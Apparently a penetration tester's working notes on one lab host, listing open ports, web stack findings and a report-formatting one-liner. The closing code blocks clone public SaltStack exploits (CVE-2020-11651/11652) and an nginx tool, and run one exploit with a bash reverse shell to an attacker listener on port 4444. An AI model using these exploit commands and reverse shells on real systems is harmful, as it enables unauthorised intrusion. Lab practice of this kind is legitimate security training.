## Intel

IP: 192.168.248.62
OS:
Arch:
Hostname:
DNS:
Domain: 
Domain SID:
Machine Purpose:
Services: 22,53,80, 4505-6?, 8000
Service Languages:
Email Address & Formatting:
Username Format:

Report writing help
```
ls -1 Screenshots | awk '{print"![]("$1")"}'
```


## Objectives
What do have in the solutions inventory to meet large network objective?

## Solution Inventory Map
Section to solve 

#### 53 

NLnet Labs NSD
- no domain name?
#### 80
/admin/ 
django + nginx 1.16.1 both 80+8000
mezzanine 

8000:
- httponly flag not set login
## Data 

#### Credentials

#### Intel

#### Local Inventory

#### Todo



#### Done


```bash
git clone https://github.com/stark0de/nginxpwner.git
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```



```bash
git clone https://github.com/dozernz/cve-2020-11651.git
python3 -m venv .venv
source .venv/bin/activate
pip3 install salt
# did not work
python3 CVE-2020-11651.py 192.168.242.62 master '/bin/bash -i >& /dev/tcp/192.168.45.191/4444 0>&1'
```


```bash
git clone https://github.com/Al1ex/CVE-2020-11652.git
python3 -m venv .venv
source .venv/bin/activate
pip3 install salt
python3 CVE-2020-11652.py -h # for help
```
